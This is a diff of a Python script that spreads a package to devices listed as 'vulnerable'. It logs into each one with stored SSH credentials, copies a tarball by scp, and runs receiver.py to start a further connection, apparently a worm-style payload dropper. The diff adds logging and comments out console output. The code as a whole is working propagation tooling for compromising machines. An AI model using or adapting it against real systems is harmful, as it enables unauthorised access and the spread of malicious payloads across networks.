@@ -3,7 +3,7 @@
 	Allan Millar
 	Package sending and initiating script
 """
-import sys, os, tarfile, time, pexpect, json
+import sys, os, tarfile, time, pexpect, json, logging
 from pathlib import Path
 from pexpect import pxssh
 
@@ -19,6 +19,7 @@ def construct_package():
     """Grabbing the files we want to send and adding them to a 
     compressed tar file. The if simply checks if the tar exists and 
     needs to be replaced."""
+    logging.info("construct_package")
     tar_file =  os.path.isfile("../prf.tar.gz")
     if tar_file:
         os.remove("../prf.tar.gz")
@@ -46,6 +47,7 @@ def ssh_connect(user, ip, dport, password):
     After succesful login, receiver.py is executed, the ssh is exited, and the
     object gets closed.
     """
+    logging.info("ssh_connect")
     try:
         #Uncomment and move between lines to see output/debug
         #ssh.prompt()
@@ -75,7 +77,7 @@ def deliver_package(user, ip, port, password):
     This method can likely be improved to only spawn one pexpect process,
     however in the interest of time I am leaving it as is since it works.
     """
-    
+    logging.info("deliver_package")
     #print("scp -P {} receiver.py {}@{}:~".format(port, user, ip))
     scp = pexpect.spawn("scp -P {} ../prf.tar.gz {}@{}:~".format(port, user, ip))
     #scp.logfile = sys.stdout.buffer
@@ -93,23 +95,25 @@ def deliver_package(user, ip, port, password):
 def initiate(ssh):
     """Start receiver.py which should initiate another connection 
     from within boidload."""
+    logging.info("initiate")
     ssh.sendline("./receiver.py")
     return ssh
 
 def disconnect(ssh):
-    ssh.sendline("exit")
+    logging.info("disconnect")
+    ssh.sendline("extracting")
     ssh.logout()
     return
 
 def main():
-    print ("construct_package")
+    #print ("construct_package")
     construct_package()
     
     with open("../resources/index.json") as json_file:
         data = json.load(json_file)
         for device, info in data["vulnerable"].items():
             try:
-                print ("\nssh_connect")
+                #print ("\nssh_connect")
                 ssh = ssh_connect(
                     info["username"], 
                     info["ip_addr"], 
@@ -117,21 +121,28 @@ def main():
                     info["password"]
                 )
             except sshException as e:
-                print (e)
+                #print (e)
                 continue
-            print ("deliver_package")
+            #print ("deliver_package")
             deliver_package(
                 info["username"], 
                 info["ip_addr"], 
                 info["port"],
                 info["password"]
             )
-            print ("initiate")
+            #print ("initiate")
             ssh = initiate(ssh)
-            print ("disconnect")
+            #print ("disconnect")
             disconnect(ssh)
 
 if __name__ == "__main__":
+    logging.basicConfig(level=logging.DEBUG, 
+        filename="db.log", 
+        filemode="w", 
+        format="%(asctime)s - %(funcName)s -" + 
+            " %(levelname)s -  %(message)s\n"
+    )
+    logging.info("starting")
     main()
 
 
